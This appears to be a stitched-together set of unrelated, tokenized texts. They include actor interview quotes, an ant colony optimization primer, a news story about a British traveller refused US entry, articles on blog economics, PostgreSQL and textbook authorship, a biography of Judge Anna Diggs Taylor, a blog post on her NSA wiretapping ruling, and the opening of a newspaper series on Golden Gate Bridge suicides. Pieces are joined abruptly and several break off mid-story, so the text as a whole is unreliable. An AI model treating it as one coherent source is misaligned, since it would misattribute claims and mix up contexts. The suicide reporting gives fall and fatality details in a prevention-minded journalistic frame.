[ on his role in Der letzte König von Schottland - In den Fängen der Macht ( 2006 ) ) I did a massive amount to prepare for this .
First of all I started learning Swahili , learning the accent , then I had to do study all the recording as well as all the books , tapes , documentaries .
When I went to Uganda I met with his [ Idi Amin 's ] brother , sister , his ministers , his generals and even to the Ugandan king .
I did more research for this role than any other character I 've probably ever played .
[ in 2006 ]
I think that there 's an awakening inside of me really honestly , and I honestly believe that the best work of my life is about to happen .
I 'm finding a balance in myself as an artist from the external and the internal , and so as a result the characters I play are going to be quite different .
So what 's going to happen is that it 's going to lift up the characters I play , we 're going to start to see it and I think it 's going to change the face of my career .
[ in 1996 ]
Directing is more comfortable for me , because as an actor there 's always something inherently false .
Because I 'm not that person .
I can spend a week in jail , but I 'm still leaving .
I once talked to a shaman who said , " What makes you think these characters you play are n't real ?
I think you should examine that . '
But it has always been my great frustration as an actor that I can't go deep into the thoughts , feelings and history of the character .
As a director .
I feel like it 's real .
I get caught up in the emotions and the story .
I like being a storyteller .
[ on ' Lee Daniels ' The Butler ' ]
Sometimes in one day I might play three different ages - a 90 year old and a 50 year old and a 30 year old ...[ working ] 20 hours a day .
I was working at least no less than 15 usually , to 18 ... I broke the script down to such a degree that i could see exactly where I was at any time and what had happened before .
I have never worked that specifically .
It was one of the most challenging roles I had ever played , and as a result it kind of revitalized me as an actor .
It brought the joy back to acting in a way .
[ on director Lee Daniels ]
He 's so present emotionally , and raw .
And sometimes you finish a scene and you go over to him , and he'd just be weeping tears in his chair , crying .
Coming over to say ' Was that okay ? '
He 's so present and sometimes he just screams out laughing in the middle of a scene .
It 's kind of exhilarating and sort of unbalancing at the same time .
I 've talked to different groups who are in social activism and stuff and I would say to them ' You take your photograph right now of the ten of you .
You may think yourselves anonymous and maybe sometimes you might be .
But I want you to remember that each step you take is a part of history .
That as we live and breathe , history is occurring .
The fact that those photographs we used to see in the ' 60s of those individuals that you admire , that you did n't know their names but saw them marching down the streets - those are us .
We need to have our voices heard , acknowledge things for what they are , because acknowledgment is a big part of the healing of the nation .
And then we have to make a conscious choice so that we can move forward to some form of repentance - some form of recompense , so that we can move into a forgiveness space of compassion .
This oneness that we 're reaching for is a hard thing to fight for because inside of it people are frightened .
They 're afraid .
There 's a fear , and we have to pass that fear ... This thread , this thing , this machine , the movement that we have to recognize , has not stopped and it 's continuing to move on .
[ on approaching each role with fresh eyes ]
There 's a good fear and there 's a negative fear .
There 's a thing you confront when you 're going into something new and you come to this sort of abyss , and then you push yourself .
It makes you try different things .
I 've been fortunate I guess : I 've gotten to play a lot of very diverse roles for quite a long time .
But in the beginning , I was thinking ' I 'm not gonna do certain characters .
I will be willing to say no and and live on a couch ' .
And I was really happy .
Maybe more happy sometimes than in latter years when I had more , when I was thinking and considering more things for different reasons - for family , for my home .
But luckily I was able to at least maintain some sort of a line .
Even if I would veer right or left , I would stay pretty close to center , and the roles were really interesting .
[ on working with Kasi Lemmons on ' Black Nativity ' ]
She is a filmmaker who has a broad breadth of understanding .
She 's passionate , very open .
She inspires you by creating a family atmosphere on set , and you always feel supported by her .
I think she had a great vision .
To do a contemporary musical with some attachment to the past is unique .
You must ask yourself if you 're standing up for what you know is right , if you 're spending time with people close to you , if you 're treating others with kindness and compassion .
These question are your moral compass , they 're your north star ...
There will always be forces - things like jealousy , greed , and anger - trying to push you away from the ideas you believe in and the causes you care most about .
Life is an active , not a passive , journey .
[ in commencement speech to graduates at California State University , Dominguez Hills ]
Biologically inspired computing arose around 20 years ago with the development of algorithms that simulate various aspects of natural processes to calculate useful results .
For instance , neural networks imitate some aspects of learning in mammalian brains to learn complex patterns ; simulated annealing simulates how metals cool into low - energy crystalline states to solve difficult minimization problems ; and genetic algorithms use abstractions of mechanisms from evolution ( selection , crossover , mutation ) to traverse large search spaces .
All have found their way into the computing mainstream , and all are regularly used in a wide range of real - world problems .
In this article , I examine a related technique that in many cases is the equal or better of existing optimization algorithms for a wide range of problems .
Ant colony optimizers ( ACOs ) model ensembles of virtual insects that cooperate on various tasks .
Remarkably , such ensembles can be used to produce answers to a range of complex problems , even though the simulated insects and the means they use to communicate are extremely simple .
For instance , ACOs are currently being used to simulate complex routing problems in telecommunications networks , where the topology of the network can vary over time .
Ant colony algorithms are closely associated with Marco Dorigo , who described the concept in his Ph.D. thesis in 1992 .
Ant colony optimization is an example of a swarm algorithm .
If you have read Michael Crichton 's thriller Prey ( HarperCollins , 2002 ) , which luridly describes swarms of semi-intelligent nanobots in competition with humans , you are familiar with some of the ideas behind this relevantly recently developed area .
In a swarm algorithm , a large number of agents cooperate to achieve a global aim without requiring any central control point .
Swarm - based systems are highly fault - tolerant because the failure of one component in a swarm does not significantly degrade the overall performance of the system .
This makes them particularly suitable for hazardous or remote environments , and the U.S. military and NASA are currently researching their use .
The US authorities have yet to comment on the case
Azar Iqbal , from Cheadle , Greater Manchester , was sent home on a plane at Atlanta last Thursday - despite officials allowing his family through .
He said he was shocked when US police allegedly saw him as a security threat as the group headed for Disneyland .
The US Department for Homeland Security told the BBC it did not comment on individual cases .
A statement for the United States Customs and Border Protection said it denied entry for " thousands of individuals every year on grounds of inadmissibility " .
Mr Iqbal said he was also told Asian people needed a special visa .
The whole experience was completely demeaning
Azar Iqbal
The incident is alleged to have taken place on the day British airports were put on alert over a reported plot to blow up several Transatlantic flights .
Mr Iqbal said after landing at Atlanta he was questioned by immigration officers who asked if he knew any of the terror suspects arrested in Britain .
He had already been cleared by airport security in Manchester before he boarded the 0900 BST Delta flight .
Mr Iqbal was travelling with his wife Rizwana and their three children Ibrahim , 5 , Murvah , 10 , and Mohin , 14 .
Mr Iqbal 's family were allowed to enter the country
He said : " It all started with the immigration man saying he wanted to ask me a couple of questions and they took me and my family to a secure area , where they quizzed me for four hours .
" They asked if I had heard about the arrests in Britain that had happened earlier that day .
They said did I know any of the people involved ?
" I was really upset and said that there was no way I would know or associate with these people .
" The whole experience was completely demeaning .
One of them even said sarcastically ' we did n't tell you to come to America on holiday ' after we complained about our treatment .
" They went through all the suitcases including the children 's belongings before telling me I was being sent back because I needed a visa despite having a British passport . "
' No documentation '
A spokeswoman for Delta Airlines said : " This is an issue which you would have to take up with the American authorities .
" Delta is not behind Mr Iqbal being refused entry into the United States . "
Mark Hunter , Liberal Democrat MP for Cheadle , said he would be writing to the Home Office and to the American embassy to ask for an explanation .
" He appears to have been turned back at Atlanta airport with no clear explanation , and he has been handed no documentation , " he said .
" All he has is a hand written note that has been entered into his passport by an official in Atlanta .
" I do n't see why our citizens should have to put up with it . "
When it comes to the profit potential of blogs , Nick Denton , founder of Gawker Media , calls himself a skeptic .
It 's a surprisingly pessimistic perspective coming from the Brit who has launched a network of 13 theme blogs – including Fleshbot ( porn ) , Gawker and Defamer ( gossip ) , Gizmodo ( gadgets ) and Wonkette ( politics ) .
His most popular properties ( Defamer , Gizmodo and Gawker ) report between 4 million and 6 million visits per month and millions more pageviews , he and his top talent have been featured in articles in the ink - and - pulp press ( Wired , The New York Times Magazine ) and Denton rarely misses an opportunity to trumpet ads on his sites for blue - chip companies like Absolut , Audi , Sony , Nike , Viacom , Disney and Condé Nast .
Media Hack
So you can forgive his competitors for not buying into his deflationary spin :
As David Hauslaib , founder of Jossip and the newly launched Queerty , put it : " Nick infamously downplays the profit potential of blogging the same way Tom Cruise 's sister - slash - publicist Lee Ann DeVette pretends his relationship with Katie Holmes is authentic .
Even people outside the industry know it 's a sham . "
Hauslaib credits part of Denton 's success to his ability to keep mainstream publishers away from his medium , guaranteeing he 'll be the biggest player when media buyers come knocking .
But Hauslaib believes there are plenty of seats left in the arena .
There could an additional handful of gossip sites to compete with Gawker ( and Jossip , for that matter ) , and ad dollars would continue to flow in .
" I 'd love to see another half - dozen professional gay blogs surface that , in theory , would compete with Queerty , " Hauslaib said , " but more importantly , they'd be validating the space and attracting even more ad dollars for everyone . "
This is a theory that Jason Calacanis – the founder of Weblogs , who Denton refers to as his " endlessly entertaining rival " – subscribes to .
Calacanis is perhaps the blogosphere 's biggest booster .
I half expect him to claim that blogs will one day provide the cure for world hunger , cancer and bad hair .
But he deserves credit for spotting a business opportunity at a time when many people viewed blogs as a digital wasteland ( complete with typos , bad grammar and lowercase letters running amok ) .
Calacanis employs 120 bloggers and publishes 90 blogs – including Engadget ( which covers consumer electronics ) and Blog Maverick , typed by billionaire entrepreneur and Dallas Mavericks ' owner Mark Cuban – with his writers making anywhere from $ 200 to $ 3,000 a month .
( One presumes Cuban does n't do it for the money . )
On average , Weblog salaries are about a quarter to half what a mid-level editorial job would pay , without the daily office commute .
" Not to mention ( bloggers ) get to write about the topic they are most passionate about , " said Calacanis , who claims to be on track to collect more than $ 1 million in Google AdSense payments over the next year .
" So , for our folks , it is like they are making money off their hobby .
Think a scuba diver or video - game player making $ 500 to $ 1,500 a month writing about scuba diving or video games . "
What do you have to do to earn $ 500 ?
Publish 125 entries a month , monitor comments , respond to readers and delete offensive comments – all for about $ 4 a post .
At least , according to a contract leaked to the internet last month .
Naturally , Denton , for one , is n't impressed with Calacanis ' wage scale ( " We pay rather more than that " ) or his business model ( " It 's easy to launch hundreds of websites , but much harder to establish brands , online as much as off " ) .
Whether you are Calacanis , Denton or Hauslaib , to create a profitable blog requires much more than a keyboard , an internet connection and too much caffeine .
You need a talented writer entertaining enough to hold an audience , a consistent publishing schedule , content worth linking to by other bloggers and worthy of press coverage , marketing savvy to sell advertising or enlist third - party networks and , as a culmination of all of this , plenty of traffic .
Says Hauslaib : " If a blog debuted with virtually zero startup costs , then it takes little to earn a profit .
One ad will do it .
But at the bare minimum , a lone blogger will likely need to attract high four - to five - figure daily visitor figures to even attempt a blog - based livable wage . "
Which led me to ask Nick Denton how much he earns from his blogs .
" We 've never gotten into the numbers , " he said .
" We 're a private company , and we prefer the focus to be on the stories ( rather ) than on the business model . "
Well , how much does he pay his bloggers ?
The amount floating around the internet is $ 2,500 a month per blogger plus traffic bonuses , courtesy of a talk Lockhart Steele , Gawker Media managing editor , gave at New York University last spring .
Denton claims that was supposed to be off the record , " which is why we have n't done any more events at NYU since .
But whatever . "
Patrick Phillips , the adjunct instructor who organized the event , supplied me with two e-mails he had sent Gawker that stipulated the talk would be tape - recorded and used as a basis for an interview to be posted on his website , I Want Media .
" The most common number quoted has indeed been $ 2,500 per month , " Denton continues , adding that it 's wrong because some writers produce more than others and get paid accordingly – " but it 's not embarrassingly wrong . "
I run some numbers by him that I picked up about his pay structure .
I say the two bloggers at Gawker earn about $ 5,000 a month .
Defamer : Between $ 7,000 and $ 10,000 a month .
Gizmodo : $ 7,000 to $ 8,000 .
And Fleshbot : $ 7,000 to $ 8,000 a month .
" Your numbers for the individual writers are particularly wild guesses , " Denton replied .
" And they are embarrassingly wrong .
If you 're making them up – nice try !
If not , you 've been misled .
Badly . "
Or there 's a third possibility .
Perhaps I 've just experienced the Denton deflationary spin machine .

Adam L. Penenberg is an assistant professor at New York University and assistant director of the business and economic reporting program in the school 's department of journalism .
Within the past two years , Oracle , IBM and Microsoft have all released freely available versions of their flagship database servers , a move that would have been unheard of just a few years ago .
While their respective representatives would argue the move was made in order to better accommodate the needs of all users , it 's fairly clear that continued pressure from open source alternatives such as MySQL and PostgreSQL have caused these database juggernauts to rethink their strategies within this increasingly competitive market .
While PostgreSQL 's adoption rate continues to accelerate , some folks wonder why that rate is n't even steeper given its impressive array of features .
One can speculate that many of the reasons for not considering its adoption tend to be based on either outdated or misinformed sources .
In an effort to dispel some of the FUD ( fear , uncertainty , and doubt ) surrounding this impressive product , instead , I 'll put forth several of the most commonplace reasons companies have for not investigating PostgreSQL further .
Reason # 1 : It does n't run on Windows PostgreSQL has long supported every modern Unix - compatible operating system , and ports are also available for Novell NetWare and OS / 2 .
With the 8.0 release , PostgreSQL 's support for all mainstream operating systems was complete , as it included a native Windows port .
Now , you can install the PostgreSQL database on a workstation or laptop with relative ease , thank to an installation wizard similar to that used for installing Microsoft Word or Quicken .
Reason # 2 : No professional development and administration tools
Most users who are unfamiliar with open source projects tend to think DB administrators manage them entirely through a series of cryptic shell commands .
Indeed , while PostgreSQL takes advantage of the powerful command - line environment , there are a number of graphical - based tools available for carrying out tasks such as administration and database design .
The following list summarizes just a few of the tools available to PostgreSQL developers : Database modeling : Several commercial and open source products are at your disposal for data modeling , some of which include Visual Case and Data Architect .
Administration and development :
There are numerous impressive efforts going on in this area , and three products are particularly promising .
pgAdmin III has a particularly long development history and is capable of handling practically any task ranging from simple table creation to managing replication across multiple servers .
Navicat PostgreSQL offers features similar to pgAdmin III and is packaged in a very well - designed interface .
A good , Web - based tool is phpPgAdmin .
Reporting : PostgreSQL interfaces with all mainstream reporting tools , including Crystal Reports , Cognos ReportNet , and the increasingly popular open source reporting package JasperReports .
Reason # 3 : PostgreSQL does n't support my language Today 's enterprise often relies on an assortment of programming languages , and if the sheer number of PostgreSQL API contributions available are any indication , the database is being used in all manner of environments .
The following links point to PostgreSQL interfaces for today 's most commonly used languages : C++ , C# , JDBC , Perl , PHP , Python , Ruby and Tcl .
Interfaces even exist for some rather unexpected languages , with Ada , Common Lisp and Pascal all coming to mind .
Reason # 4 : There 's nobody to blame when something goes wrong
The misconception that open source projects lack technical support options is curious , particularly if one 's definition of support does not involve simply having somebody to blame when something goes wrong .
You can find the answers to a vast number of support questions in the official PostgreSQL manual , which consists of almost 1,450 pages of detailed documentation regarding every aspect of the database , ranging from a synopsis of supported data types to system internals .
Proprietary vendors ' free databases : Database heavyweights IBM , Microsoft and Oracle have all recently released free versions of their products .
More information about the respective products can be found by navigating to the following links : IBM DB2 Express - C
Microsoft SQL Server 2008 R2
Oracle Database 10g Express Edition
The PostgreSQL documentation is available for online perusal and downloading in PDF format .
For more help , there are a number of newsgroups accessible through Google groups , with topics ranging across performance , administration , SQL construction , development and general matters .
If you 're looking for a somewhat more immediate response , hundreds of PostgreSQL devotees can be found logged into IRC ( irc.freenode.net # postgresql ? ) .
You can plug in to IRC chat clients for all common operating systems ( Windows included ) at any given moment .
For instance , on a recent Wednesday evening , there were more than 240 individuals logged into the channel .
Waking up the next morning , I found more than 252 logged in , including a few well - known experts in the community .
The conversation topics ranged from helping newcomers get logged into their PostgreSQL installation for the first time to advanced decision tree generation algorithms .
Everyone is invited to participate and ask questions no matter how simplistic or advanced .
For those users more comfortable with a more formalized support environment , other options exist .
CommandPrompt Inc.'s PostgreSQL packages range from one - time incident support to 24x7 Web , e-mail and phone coverage .
Recently , Pervasive Software Inc. jumped into the fray , offering various support packages in addition to consulting services .
Open source services support company SpikeSource Inc. announced PostgreSQL support last summer , along with integration of the database into its SpikeSource Core Stack .
Gilbert T. Sewall , director of the American Textbook Council , a nonprofit group that monitors history textbooks , said he was not familiar with this particular incident .
But Mr. Sewall said the publishing industry had a tendency to see authors ’ names as marketing tools .
“ The publishers have a brand name and that name sells textbooks , ” he said .
“ That ’s why you have well - established authorities who put their names on the spine , but really have nothing to do with the actual writing process , which is all done in - house or by hired writers . ”
The industry is replete with examples of the phenomenon .
One of the most frequently used high school history texts is “ Holt the American Nation , ” first published in 1950 as “ Rise of the American Nation ” and written by Lewis Paul Todd and Merle Curti .
For each edition , the book appeared with new material , long after one author had died and the other was in a nursing home .
Eventually , the text was reissued as the work of another historian , Paul S. Boyer .
Professor Boyer , emeritus professor of history at the University of Wisconsin at Madison , acknowledged that the original authors had supplied the structure of the book that carries his name .
But he said that as he revises the text , he adds new scholarship , themes and interpretations .
He defended the disappearance of the original authors ’ names from the book , saying it would be more misleading to carry their names when they had no say in current editions .
“ Textbooks are hardly the same as the Iliad or Beowulf , ” he added .
Richard Blake , a spokesman for Harcourt Education , a division of Holt , said none of the editors involved in the extended use of the Todd and Curti names were still with the company .
But he said that now “ all contributors and reviewers on each edition are listed in the front of the book , ” and that naming new principal authors depended largely on the extent of their contributions .
The similarities in the Prentice Hall books were discovered by James W. Loewen , who is updating his 1995 best seller , “ Lies My Teacher Told Me : Everything Your American History Textbook Got Wrong . ”

“ Treatment of 9/11 and the two Iraq wars and the Florida election of 2000 are among the more important pieces of our past , ” Mr. Loewen said .
“ I think that these authors should have actually written these passages they claim to write . ”

In 1979 , Anna Diggs Taylor became the first black woman judge to be appointed to the United States District Court for the Eastern District of Michigan .
Nineteen years later , she became the first black woman Chief Judge for that circuit as well .
Taylor had great difficulty obtaining her first job as an attorney for the Office of Solicitor for the U.S. Department of Labor , despite graduating form the prestigious Yale Law School in 1957 .
Very few opportunities existed for a black woman in law at this time .
In 1961 , Taylor relocated from the Washington D.C. area to Detroit , Michigan .
Here she was involved in both public and private practice until her appointment to the U.S. District Court for the Eastern District of Michigan , on which she continues to serve .
Taylor ’s position has enabled her to open doors for other women and minorities to pursue and achieve their dreams .
She strives for gender and racial equality in the law and currently serves on the Joint Steering Committee of the Gender and Racial Ethnic Fairness Task Forces for the Sixth Circuit .

I do not yet know anything more than what is in this AP article , but if it is accurate , it is extraordinary news -- extraordinarily good news -- on every level .
I will update this post continuously as I get more information , particularly once I get the opinion :
This is the case brought by the ACLU against the Bush administration directly .
Some background on the case is here , where I previously noted that it seemed the judge was , at the very least , intent on scrutinizing , rather than blindly accepting , the Bush administration 's claims .
This also means , presumably , that this is now the second consecutive federal court to reject the Bush administration 's invocation of the " state secrets " doctrine as a means of avoiding judicial review .
This is huge news , obviously .
More to follow .* * * I went to the CNN website to see if they had anything on this decision , and saw a bright red box at the top with urgent " BREAKING NEWS " language in it , so I naturally assumed they were reporting it .
Then I read this inside the flamboyant box : I have no doubt that infinitely more coverage will be devoted to that issue on every news program today than on the fact that a federal court just ruled that the President 's warrantless eavesdropping program is unconstitutional *
* * * The opinion is here ( .pdf ) ; the injunction order is here ( .pdf ) .
I will have analysis on this shortly .* * * * I have read the opinion .
Here is my immediate analysis of it .
It is a very strong opinion in some places , weak in others , but is rather straightforward -- and sometimes eloquent -- in its almost always unequivocal rejection of the Bush administration 's arguments : , the court rejected the administration 's assertion of the " state secrets " doctrine with regard to the NSA eavesdropping program on the ground that the program has already been publicly confirmed by the administration , and that all of the known facts necessary to rule on the plaintiffs ' claims -- namely , that the administration is eavesdropping without warrants -- are already publicly known .
The court adopted the reasoning of Judge Walker who , as noted above , rejected the administration 's invocation of this doctrine on the same ground .
( The court here did , however , grant the administration 's motion to dismiss the part of the case challenging the constitutionality of the data - mining program , on the ground that it has not yet been confirmed , and litigation of its legality would therefore require disclosure of state secrets ) . , the court ruled that the plaintiffs have standing to challenge the legality of the NSA program even though they cannot prove they have been eavesdropped on , because they have suffered actual harm merely from knowing that the Government is eavesdropping .
They all allege that they have extensive communications with the Middle East by telephone and fear that the administration is listening in without a warrant .
Some are attorneys who fear the administration is eavesdropping on their conversations with their clients and witnesses , and they allege that these clients and witnesses have ceased communicating with them openly as a result .
Thus , the court held that these plaintiffs are suffering actual harm in their ability to carry out their professional duties as a result of the administration 's warrantless eavesdropping program .
That actual harm confers on them standing to challenge the legality of the program .
The court also emphasized , in an excellent section I will quote shortly , that it is vital to our democracy that the administration 's conduct not remain beyond the reach of judicial scrutiny . , the court ruled -- rather emphatically and without much doubt -- that warrantless eavesdropping violates the Fourth Amendment 's prohibition on unreasonable searches and seizures ( generally speaking , searches undertaken in the absence of a probable cause warrant ) .
Citing the 1972 Supreme Court decision in the Keith case ( more on that here ) -- which held that warrantless eavesdropping is unconstitutional in the context of investigating domestic terrorist groups -- the court held ( admittedly without much reasoning or even explicit arguments ) that the same reasoning applies to make warrantless eavesdropping unconstitutional in the context of investigating international terrorist groups . , the court ruled independently -- again , without all that much reasoning -- that the NSA program violates the plaintiffs '
First Amendment rights , apparently because it chills ( deters ) their free expression .
Since the plaintiffs know the Government can eavesdrop without warrants on conversations of those groups and individuals deemed " subversive , " the program abridges free expression in a way that the First Amendment prohibits . , the court relied upon Youngstown to hold that the Executive 's powers in the national security area do not entitle him to act beyond the law or the Constitution , and that courts are empowered under our Constitution to enjoin and restrict the exercise even of national security powers , even in times of war , when the President 's conduct violates the law or the Constitution . , the court swiftly and dismissively rejected the administration 's claim that the AUMF constitutes authorization to eavesdrop in violation of FISA , noting that FISA is an extremely specific statute while the AUMF says nothing about eavesdropping .
In any event , as the court noted , since the court found warrantless eavesdropping unconstitutional , Congress could not authorize warrantless eavesdropping by statute . , the court made its scorn quite clear for the administration 's
Yoo theory of executive power because , as the court put it , " there are no hereditary kings in America and no powers not created by the Constitution . "
Citing Youngstown again , the court made clear that even in time of war , and even with regard to the President 's Commander - in - Chief powers , the President is subject to constitutional restrictions -- a proposition long unquestioned in our system of government until the Bush administration began inventing radical theories of executive power . , and really quite extraordinarily , the court ( a ) declared the NSA program to be in violation of FISA , the First Amendment and Fourth Amendment and ( b ) issued a permanent injunction enjoining the Bush administration from continuing to eavesdrop in violation of FISA .
This is not the most scholarly opinion ever .
It has argumentative holes in it in several important places .
But it is correct in its result and it is an enormous victory for the rule of law .
It took real courage for Judge Diggs Taylor to issue this Opinion and Order -- it is hard to overstate how much courage it took .
It will obviously be appealed .
But as of right now , it is illegal , according to this federal court , for the Bush administration to continue to implement its " Terrorist Surveillance Program , " and since it is grounded in constitutional conclusions , nothing -- such as Arlen Specter 's dreaded bill -- could change that .* * * * I 've heard reports that the reliably vile Rush Limbaugh is already attacking the judge personally -- she 's a Carter appointee , etc .
First , the judge who rejected the Bush administration 's attempt to have the California / AT&T litigation dismissed ( Judge Vaughn Walker ) -- on whose reasoning Judge Diggs Taylor relied -- is a Bush 41 appointee .
Secondly , the Judge 's background is extremely impressive , making it quite hard , even for the likes of Rush Limbaugh , to demonize her or demean her abilities :
One can only fathom the personal attacks that will be spewing forth against her .* * * * According to the ACLU , the Justice Department has notified them that they intend to ask the District Court Judge to stay her decision pending appeal to the Sixth Circuit ( meaning the injunction would not apply immediately , but would only be activated if the decision were affirmed on appeal ) .
Typically , with a decision of this magnitude -- particularly one that changes , rather than preserves the status quo -- a court would stay the decision .
I was surprised that she did not stay it on her own ( perhaps the Government did not ask ) .
Ordinarily , I would be inclined to think that it was almost automatic that the decision would be stayed , but given how dismissive she was of the administration 's arguments -- and how unequivocal were her conclusions that this program violates the constitutional rights of Americans -- I would n't be all that shocked if she refused to ( the administration could still then ask the Sixth Circuit Court of Appeals to stay the Order ) .* * * * * Let 's see what our friends in the Bush follower crowd are saying .
Legal scholar Jeff Goldstein immediately puts the spotlight on the Judge personally , and highlights " that she was married to Michigan Democratic Representative ( 1955 - 1980 ) Charles C Diggs , Jr. ( divorced 1971 ) and S Martin Taylor ( active in both the Coleman Young and Jimmy Carter campaigns ) " and that " was the first African - American woman appointed to a federal judgeship in Michigan . . . .
Taylor has used her positions to advance civil rights throughout the United States . "
He then announces that he " think (s ) this ruling will be overturned on appeal . "
And , needless to say , included in the first 10 comments is a plea that the President defy the order , along with a call for the judge to be drowned .
Ace of Spades is so beside himself that he seems sadly deflated ; he merely dutifully launches the two standard Bush smears at the Judge , but without much feeling -- he doubts she " takes terrorism seriously " and he " question (s ) her sanity . "
Writing on Michelle Malkin's blog , Mary Katherine Ham also focuses on the Judge 's background , quoting a Detroit Free Press profile which describes her as " a liberal with Democratic roots and defended civil - rights workers in the South in the 1960s . "
The article ( and Ham ) point out , however , that " people who know her say she will follow the law -- not her politics -- in deciding the case ... "
And this is what National Review Corner readers learned about this decision :
It 's a " Terrorist - Friendly ruling " from a " Carter appointee . "
So , so far we have - ( 1 ) the Judge was appointed by Jimmy Carter ; ( 2 ) the Judge is African - American and works on " civil rights " matters ; ( 3 ) she is insane ; ( 4 ) she does not take terrorism seriously ; ( 5 ) this is a victory for the terrorists ; ( 6 ) President Bush should defy the Order .
That 's a predictable enough beginning , but the smear machine is going to have to work a little harder , because that is not all that impressive of an attack so far .
I recommend the Free Press profile -- read that and decide if her abilities and fairness can be legitimately demonized .* * * * More pro-Bush reaction is compiled here , including this from Jawa Report ( " lets hope the first bomb that comes here is dropped on this judges head " ) and this from Debbie Schussel ( " She seems to hate America and fairness almost as much as the Plaintiffs do " ) .
And some nice race - based smearing can be found by Gateway Pundit here ( her husband was a Congressman whose " district included downtown Detroit and some of the city 's poorest neighborhoods .
He was the first chairman of the Congressional black Caucus " ) .
That 's really relevant .* * * * Let 's resoundingly clear up two widely disseminated misconceptions , the first of which is being quite deliberately tossed around : (1) Even with this Order , the Bush administration .
They just have to do so with approval of the FISA court -- just like all administrations have done since 1978 , just as the law requires , and just as they did when eavesdropping as part of the surveillance they undertook on the U.K. terror plot .
(2) The court 's ruling that warrantless eavesdropping violates the Fourth and First Amendments clearly means ( although the decision is far from a model of clarity ) that Congress cannot authorize warrantless eavesdropping with legislation , which would preclude enforcement of the Specter bill .
This is clearest when the court rejects the administration 's argument that the AUMF implicitly authorized violations of FISA .
The court ruled that : ( a ) the AUMF cannot be read to amend FISA , but that ( b ) even if it could be so read , it would not matter , because Congress cannot authorize an unconstitutional program :
Op. at 39 ( emphasis added ) .
If Congress is not empowered to authorize this program through the AUMF ( because the program is unconstitutional ) , then there is no good argument as to why the Specter bill can .

Editor 's Note :
The first installment of a series of stories on Golden Gate Bridge suicides , which appeared Sunday , contained material that had appeared in the Oct. 13 , 2003 , edition of the New Yorker magazine .
The story should have attributed quotations from Ken Baldwin of Angels Camp and Marin County Coroner Ken Holmes to the magazine .
It also used language nearly identical to that of the magazine to describe the California Highway Patrol 's decision to halt the official count of suicides at 997 and to describe the unofficial 1,000th death .
*****
One - thousand , two - hundred eighteen dead .
The lives of families devastated .
Sixty - eight years of debate about a suicide barrier .
Today , The Chronicle begins a seven - part series looking at the darker side of the Golden Gate Bridge .
The conclusion is inescapable : A suicide barrier would prevent deaths .
Golden Gate Bridge district directors voted in March to authorize a $ 2 million feasibility study , which has not yet been fully funded .
The stories this week provide the context , background , meaning and a human dimension for the decisions that will follow .
We take it for granted -- those of us who spend our lives here .
But the potency of the Golden Gate Bridge , in its symbolism and beauty , is probably unmatched by any other urban structure in the world .
On those halcyon afternoons when fog threads the bridge 's harp strings and suspension cables , when clouds settle over the East Bay hills and the sun catches diamonds in the bay , this greatest of vistas exhibits itself proudly : tawny hills of Marin , shimmering bulk of Angel Island , raw beacon of Alcatraz and the lazy , Mediterranean contours of San Francisco .
This is the view , on a good day , that greets the suicide before he jumps -- a panorama enthralling in its harmony of land , sea and sky .
Even when the cooling fog blunts the view , the vast majority of jumpers take their last step facing east instead of west toward the Pacific .
The Golden Gate Bridge is the world 's No. 1 suicide magnet , in part because it makes suicide so easy .
People jump and kill themselves there , an average of 19 a year .
In the peak year , 1977 , there were 40 suicides .
Some dive not expecting obscurity or oblivion but a kind of grace -- a welcoming body of water that inducts the jumper into nature .
" I 'd heard the water just sweeps you under , " Ken Baldwin of Angels Camp in Calaveras County , who survived his jump in 1985 , told the New Yorker magazine .
In fact , there 's nothing peaceful in a jump from the bridge .
Once a person dives , depending on where he or she jumps , the body plummets 240 to 250 feet in four seconds , traveling about 75 mph , and hits the water with the force of a speeding truck meeting a concrete building .
Some die instantly from extensive internal injuries ; others drown in their own blood .
The jump is fatal 98 percent of the time .
The Chronicle 's research indicates that at least 1,218 suicides were reported between the time the bridge opened , on May 27 , 1937 , and this past Friday .
Local mental health experts believe that number could be higher , considering the suicides who jump and go undetected , their bodies floating out to sea .
Three to 1 , they 're men , according to a recent study by the Psychiatric Foundation of Northern California that compiled Marin County coroner 's reports from January 1995 to July 2005 .
Eighty - seven percent are Bay Area residents -- exploding the myth that people flock from around the world to die here .
They range from 14 to 85 , with an approximate median age of 41 .
Some leave suicide notes ; most do n't .
An estimated 26 jumpers have survived , according to San Francisco Suicide Prevention and the Marin County coroner .
Beyond those numbers , it 's difficult to draw a collective profile .
The first jumper , on Aug. 7 , 1937 , was Harold Wobber , a World War I veteran .
Wobber turned to a stranger on the walkway -- saying , " This is as far as I go " -- and took his last step .
Robert Byther , a 27 - year - old Navy veteran , flew from Virginia to San Francisco in December 1980 specifically to jump off the bridge to protest the election of Ronald Reagan as president .
Filomeno De La Cruz , 33 , celebrated Thanksgiving with relatives in 1993 , then walked his 2 - year - old son along the bridge .
Around 5 p.m. , De La Cruz lifted the child from his stroller , grasped him in his arms and jumped over the guardrail .
" He was going through a divorce and custody fight , " a homicide inspector said at the time .
Weldon Kees , 40 , was a poet and filmmaker who produced KPFA 's radio show " Behind the Movie Camera . "
Kees parked his 1954 Plymouth Savoy at the bridge parking lot on July 18 , 1955 , left his keys in the ignition and disappeared .
His body was never recovered .
Fifty years later , Jonathan Zablotny , a senior at International High School , took his life .
" Overall he had more reasons to be happy than to kill himself , " wrote Zablotny 's friend Patrick Fitzgerald in a letter to the bridge district board .
" He told no one and left no note .
All we know is that he left for school Tuesday morning and never got there .
That afternoon he was dead . "
Tho the dark be cold and blind ,
Yet her sea - fog 's touch is kind ,
And her mightier caress
Is joy and the pain thereof ;
And great is thy tenderness ,
O cool , grey city of love !
Poet George Sterling wrote those words in 1923 , and the late Chronicle columnist Herb Caen was fond of quoting the last line .
Sterling 's words effuse romantic notions of San Francisco , its generous spirit and the " tenderness " of its residents .
In a city defined by loss and impermanence -- settled by gold speculators , razed by earthquake and fire , notorious as an open port where anything goes -- Sterling found forgiveness and redemption , a balm for loneliness .
We like to feel good about where we live -- to believe that San Francisco retains its warmth and charitable heart .
But the " cool , grey city of love " has for 68 years neglected an epidemic of death .
Whereas officials at the Eiffel Tower , Empire State Building and other suicide landmarks recognized a crisis and erected suicide barriers , the Golden Gate Bridge still offers a welcome mat to someone in search of a quick exit .
We sense the tragedy but view it in the abstract , rationalizing the deaths with a laissez - faire attitude : " They have a right to end their lives if they choose . "
During the months of reporting on this series , the majority of people interviewed voiced this sentiment , often in glib terms .
" If they did n't have the Golden Gate Bridge , they 'd just kill themselves another way . "
